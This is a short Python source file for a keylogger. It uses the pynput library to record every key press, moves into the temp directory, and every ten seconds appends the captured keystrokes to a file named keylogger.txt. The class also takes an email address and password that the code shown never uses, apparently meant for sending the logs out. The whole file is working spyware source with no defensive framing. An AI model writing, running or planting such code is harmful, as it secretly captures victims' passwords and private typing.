#!/usr/bin/env python
import pynput.keyboard, threading, tempfile, os


class Keylogger:
    def __init__(self, email, password):
        os.chdir(tempfile.gettempdir())
        self.email = email
        self.password = password
        self.log = ""

    def append_to_log(self, string):
        self.log = self.log + string

    def respons(self):
        if self.log:
            with open("keylogger.txt", "a") as my_file:
                my_file.write(self.log)
        self.log = ""
        time = threading.Timer(10, self.respons)
        time.start()

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + (str(key)) + " "
        self.append_to_log(current_key)

    def start(self):
        keyboard = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard:
            self.respons()
            keyboard.join()